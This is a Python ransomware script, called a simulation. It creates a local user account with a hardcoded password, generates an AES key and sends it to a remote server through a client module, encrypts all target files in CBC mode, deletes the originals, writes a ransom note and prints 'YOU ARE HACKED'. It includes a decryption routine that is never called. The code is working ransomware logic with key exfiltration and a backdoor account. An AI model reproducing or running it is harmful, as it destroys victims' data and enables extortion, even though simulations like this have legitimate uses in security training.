import os
import subprocess
import platform
from Crypto.Cipher import AES
import base64
from pathlib import Path
import time
import copy
from client import start_client
from config import (
    TARGET_DIR,
    ENCRYPTED_EXTENSION

)
from utils import get_all_target_files, is_safe_to_encrypt, write_ransom_note

def generateKey():
    key = os.urandom(16)
    try:
        start_client(key)
    except Exception as e:
        print(f"Error sending key to server: {e}")
    return key

def generateIv():
    iv = os.urandom(16)
    return iv

def encryptFile(filepath,key,iv):
    """
    Encrypt a single file and append .locked extension (preserving original extension).
    Handles both text and binary files.
    Example: file.pdf → file.pdf.locked
    """
    path = Path(filepath)
    if not is_safe_to_encrypt(filepath):
        print(path)
        return
    
    # Append .locked to preserve original extension
    encrypted_path = Path(str(path) + ENCRYPTED_EXTENSION)

    print(encrypted_path)

    try:
        with open(path, "rb") as f:
            plaintxt = f.read()
            cipher = AES.new(key,AES.MODE_CBC,iv)
            # Pad to 16-byte boundary using PKCS7
            padding_len = 16 - (len(plaintxt) % 16)
            padded_plaintxt = plaintxt + (bytes([padding_len]) * padding_len)
            ciphertxt = cipher.encrypt(padded_plaintxt)
            encodedCipher = base64.b64encode(iv+ciphertxt).decode()

        with open(encrypted_path, "w") as f:
            f.write(encodedCipher)
        path.unlink()
    except Exception as e:
        print(f"Encryption failed for {filepath}: {e}")

def decryptFIle(filepath,key):

    """
    Decrypt a single .locked file back to original name & content.
    Removes .locked extension to restore original filename.
    Example: file.pdf.locked → file.pdf
    Handles both text and binary files.
    """
    path = Path(filepath)
    if path.suffix != ".locked":
        print(f"Skipping non-encrypted file: {path.name}")
        return
    original_path = copy.copy(path)
    
    print(original_path)
    try:
        with open(path, "r") as f:
            encrypted_data = f.read()

        try:
            raw_data = base64.b64decode(encrypted_data)
            iv = raw_data[:16]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_bytes = cipher.decrypt(raw_data[16:])
            # Remove PKCS7 padding
            padding_len = decrypted_bytes[-1]
            decrypted_bytes = decrypted_bytes[:-padding_len]
        except Exception as e:
            print(f"Decryption failed (wrong key or corrupted file): {path.name}:{e}")
            return
        # Remove .locked suffix to restore original filename
        original_path = Path(str(original_path)[:-len(ENCRYPTED_EXTENSION)])
        with open(original_path, "wb") as f:
            f.write(decrypted_bytes)
        path.unlink()  # remove encrypted version
        print(f"Decrypted: {path.name} → {original_path.name}")
    except Exception as e:
        print(f"Decryption failed for {filepath}: {e}")

def create_dummy_user(username="ransomware_sim", password="SimPassword123!"):
    """
    Create a new user account for the simulation.
    Windows: Uses 'net user' command
    Linux/Mac: Uses 'useradd' command
    """
    try:
        system = platform.system()
        
        if system == "Windows":
            # Windows: Create user with net user command
            cmd = f'net user {username} {password} /add'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                #print(f"✓ User '{username}' created successfully on Windows")
                return True
            elif "already exists" in result.stderr.lower():
                #print(f"⚠ User '{username}' already exists")
                return True
            else:
                print(f"⚠ Failed to create user: {result.stderr}")
                return False
        
        elif system in ["Linux", "Darwin"]:
            # Linux/Mac: Create user with useradd (requires sudo)
            cmd = f'sudo useradd -m -s /bin/bash {username}'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"✓ User '{username}' created successfully on {system}")
                return True
            elif "already exists" in result.stderr.lower():
                print(f"⚠ User '{username}' already exists")
                return True
            else:
                print(f"⚠ Failed to create user: {result.stderr}")
                return False
        else:
            print(f"⚠ OS {system} not supported for user creation")
            return False
    
    except Exception as e:
        print(f"⚠ Exception during user creation: {e}")
        return False

def encrypt_all_files(key,iv):
    files = get_all_target_files()
    for filepath in files:
        encryptFile(filepath,key,iv)
    write_ransom_note()

def decrypt_all_files(key):
    # Find all .locked files
    locked_files = [str(p) for p in Path(TARGET_DIR).rglob(f"*{ENCRYPTED_EXTENSION}")]

    if not locked_files:
        print("No .locked files found to decrypt.")
        return

    print(f"Found {len(locked_files)} encrypted files to recover")

    for filepath in locked_files:
        decryptFIle(filepath, key)
    print(f"Decryption finished.")


print("=" * 60)
print("RANSOMWARE SIMULATION - ENCRYPTION PHASE")
print("=" * 60)

# Create dummy user account
print("\n[1/3] Creating dummy user account...")
create_dummy_user("ransomware_sim", "SimPassword123!")
    
# Generate key and IV
print("\n[2/3] Generating encryption key...")
key = generateKey()
iv = generateIv()

# # Save key for recovery (for testing/demo only)
# with open("encryption_key.txt", "w") as f:
#     f.write(f"Key (hex): {key.hex()}\n")
#     f.write(f"IV (hex): {iv.hex()}\n")
# print(f"✓ Key saved to encryption_key.txt for recovery")
# print(f"  Key: {key.hex()}")

# Encrypt all files
print("\n[3/3] Encrypting files...")
encrypt_all_files(key,iv)
print("\n" + "=" * 60)
print("YOU ARE HACKED..")
print("=" * 60)
#time.sleep(5)
    
print("\n" + "=" * 60)
print("✓ SIMULATION COMPLETE")
print("=" * 60)
# print(f"Files encrypted and stored with .locked extension")
# print(f"To decrypt: python recover.py")    
# Uncomment to test decryption immediately:
# decrypt_all_files(key)
